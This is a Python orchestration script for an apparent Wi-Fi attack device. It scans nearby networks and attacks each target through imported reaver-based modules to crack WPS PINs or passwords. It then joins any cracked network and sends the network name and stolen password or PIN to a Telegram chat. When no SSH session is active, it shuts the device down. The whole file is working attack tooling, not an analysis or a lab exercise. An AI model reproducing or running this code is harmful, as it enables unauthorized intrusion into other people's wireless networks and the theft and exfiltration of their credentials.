import os
import json
import logging
import subprocess

from utils import clean_files
from constants import (
    TARGETS_FILE,
    CRACKED_FILE,
    ATTACK_INTERFACE,
    REAVER_OUTPUT,
    DEBUG_LOG
)
from wifi_scan import scan_targets
from wifi_attack import attack_target
from wifi_connect import connect_to_wifi
from send_to_telegram import send_message

# --- Constants ---
CONFIG_PATH = os.path.join(os.path.dirname(__file__), "config.json")


# --- Utility functions ---
def load_config():
    try:
        with open(CONFIG_PATH) as f:
            return json.load(f)
    except Exception as e:
        print(f"[!] Failed to load config.json: {e}. Defaulting to stop_on_success=True")
        return {}

def has_internet():
    try:
        subprocess.check_call(
            ["ping", "-c", "1", "-W", "2", "8.8.8.8"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return True
    except subprocess.CalledProcessError:
        return False

def is_ssh_active():
    try:
        output = subprocess.check_output(["ps", "-eo", "pid,ppid,user,args"]).decode()
        for line in output.splitlines():
            if "sshd:" in line and ("@pts" in line or "@tty" in line):
                return True
        return False
    except Exception:
        return False

# --- Init ---
os.chdir(os.path.dirname(os.path.abspath(__file__)))
config = load_config()
stop_on_success = config.get("stop_on_success", True)

os.makedirs(os.path.dirname(DEBUG_LOG), exist_ok=True)

logging.basicConfig(
    filename=DEBUG_LOG,
    level=logging.DEBUG,
    format="%(asctime)s [%(levelname)s] %(message)s"
)
console = logging.StreamHandler()
console.setLevel(logging.INFO)
console.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
logging.getLogger().addHandler(console)

open(DEBUG_LOG, "w").close()
logging.info("Starting networkObserver")

# --- Cleanup ---
clean_files(TARGETS_FILE, CRACKED_FILE, REAVER_OUTPUT)
logging.info("Temporary files cleaned.")

# --- Main logic ---
targets = scan_targets(ATTACK_INTERFACE)

while targets:
    essid, power = targets.pop(0)
    logging.info(f"Attacking {essid} (power: {power} dB)")
    result = attack_target(ATTACK_INTERFACE, essid)

    if result:
        connected = connect_to_wifi(essid, pin=result.get("pin"), psk=result.get("psk"))
        if connected:
            msg = f"[+] Target compromised:\nSSID: {essid}"
            if result.get("psk"):
                msg += f"\nPassword: {result['psk']}"
            elif result.get("pin"):
                msg += f"\nWPS PIN: {result['pin']}"

            if has_internet():
                logging.info("Connection successful. Sending to Telegram...")
                send_message(msg)
            else:
                logging.warning("Connected, but no internet. Skipping Telegram message.")

            if stop_on_success:
                logging.info("Stopping after first successful compromise (as per config).")
                break
        else:
            logging.warning(f"Connection to {essid} failed after PIN/PSK.")
    else:
        logging.warning(f"No credentials obtained for {essid}.")

logging.info("Process completed.")

# --- Shutdown ---
if is_ssh_active():
    logging.info("SSH session detected. Skipping shutdown.")
else:
    logging.info("No SSH session. Proceeding with shutdown.")
    os.system("sudo poweroff")
